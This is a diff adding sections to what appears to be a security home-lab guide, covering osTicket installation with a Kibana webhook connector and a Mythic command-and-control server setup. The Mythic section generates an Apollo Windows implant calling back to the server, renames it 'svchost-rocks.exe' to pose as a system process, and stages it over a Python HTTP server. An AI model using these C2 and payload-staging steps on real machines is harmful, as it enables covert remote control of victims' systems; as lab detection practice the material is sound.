@@ -208,6 +208,150 @@ Get-Process sysmon64
 
 <img src=’12’/>
 
+### osTicket Server Setup
+1. On the osTicket server download xampp from the [official website](https://www.apachefriends.org/download.html)
+2. Similarly download osTicket from its [official website](https://osticket.com/download/)
+3. Install xampp with default settings
+4. Extract osTicket.
+5. Configure the xampp properties file located in the xampp folder on the C drive
+6. Change the apache domain name to the osTicket server IP.
+
+<img src=’22’/>
+
+7. Launch xampp control panel and start Apache and MYSQL
+8. Go to phpMyAdmin and create a new database
+
+<img src=’23’/>
+
+9. Go to home -> User account and change the root account for the host by clicking on the root and changing the password.
+10. Some warning will appear but those are expected.
+11. Next change the login information
+12. Change the host name type to “Use text field” and name to osTicket Server IP
+13. Provide the password you set for root and on the bottom click on "keep the old" and then click on go.
+
+<img src=’24’/>
+
+14. Go to the phpMyAdmin folder on xampp and configure the config.inc.php (C:\xampp\phpMyAdmin\config.inc.php) file and change the password
+
+<img src=’25’/>
+
+15. Try reconnecting and you will be able to reconnect with no issue
+
+<img src=’26’/>
+
+16. Make sure that you have full access to the newly created database.
+17. You will be provided two files when you extract osTicket zip. Copy both file and navigate to the htdocs folder of xampp.
+18. Create a new folder named "osticket" and paste both the files.
+19. Access the server using the http://(osTicket Server IP)/osticket/upload
+20. Click on continue and you will be prompted to make some changes to the configuration file.
+21. In the “upload” folder of the “osticket” folder navigate to “include” and you will find “ost.sample.config” file
+22. Rename the file to “ost-config.php”
+
+<img src=’27’/>
+
+23. In the osTicket interface if you click continue you will be prompted to provide some information to complete the basic installation
+24. Fill up the fields by providing the required information
+
+<img src=’28’/>
+
+25. Click on “install now” and you will be provided with a URL to access osTicket.
+26. You can login using the username and password you set.
+
+<img src=’29’/>
+
+27. Fill up the System Settings and Preferences information using the osTicket Server IP as the URL (http://(osTicket Server IP)/osticket/upload).
+
+<img src=’30’/>
+
+28. Go to the manage -> API section  and click on Add New API Key
+29. Provide the IP address of the "ELK Server" in the IP Address section then select "Can Create Tickets" and Add Internal Notes as a reminder of the API key's use.
+30. Copy the API key and go to the Kibana Interface
+31. In the interface under “Alerts and Insights”, select “Connectors”.
+32. Search for “Webhook connector” and select it. Webhook connector may require trial or a paid subscription depending on your Kibana deployment.
+33. In the Webhook connector, provide the URL as “http://(osTicket Server IP)/osticket/upload/api/tickets.xml” then select Authentication as none.
+34. Add HTTP header key as “X-API-Key” and value as the provided key value in the OSTicket interface.
+35. On the top there is a test option to check if the connection has been correctly configured.
+36. Copy the code from the  [Github repo of osTicket](https://github.com/osTicket/osTicket/blob/develop/setup/doc/api/tickets.md)
+
+<img src=’31’/>
+
+37. Run the test and in the osTicket interface navigate to “Admin panel” and you will see a new Ticket as “Testing API”
+<img src=’32’/>
+
+### Configure Mythic Server
+1. First install Docker on the mythic server 
+```bash
+sudo apt install docker-compose
+```
+2. Enable and start docker
+```bash
+sudo systemctl enable docker.service
+sudo systemctl start docker.service
+sudo systemctl status docker.service
+```
+3. Clone the mythic github repo to the server and navigate to the mythic directory
+```bash
+git clone https://github.com/its-a-feature/Mythic 
+ls 
+cd ./Mythic
+```
+4. Install make and start make inside the directory
+```bash
+sudo apt install make
+sudo make
+```
+5. Finally start mythic using the below command.
+```bash
+sudo ./mythic.cli start
+```
+<img src=’13’/>
+
+6. It will take some time and when it starts you can access it using the following url “https://(Mythic IP):7443”
+
+<img src=’14’/>
+
+7. The login credentials are randomly generated and can be accessed using the below command
+```bash
+cat .env
+```
+8. From the credentials collect the mythic admin username and password.
+9. It's time to add payload. We will be using Apollo agent and  http C2 profile
+10. To download the payload we will use the below command.
+```bash
+sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
+sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http 
+```
+<img src=’15’/>
+<img src=’16’/>
+<img src=’17’/>
+
+11. We are going to make the payload by clicking on the payload icon on the screen and "Generate New Payload" which is on the dropdown of the "ACTIONS" button.
+12. Click on New payload and select the following
+   * Windows for OS type
+   * Apollo for payload type
+   * Include all commands
+   * For C2 profile select http
+   * For the callback host select the IP of the Mythic Server.
+   * Now select Apollo payload and create the payload 
+
+<img src=’18’/>
+
+13. Download the payload by clicking on the download icon and copying the payload link address
+14. Go to the command line and type the following
+```bash
+cd ./
+ls
+wget https://(Mythic IP):7443/direct/download/<payload> --no-check-certificate
+```
+15. Rename the file
+```bash
+mv (payload name) svchost-rocks.exe
+```
+16. Start a python http server for transferring the payload to the windows machine using the below command.
+```bash
+python3 -m http.server 9999
+```
+<img src=’19’/>
 
 
 
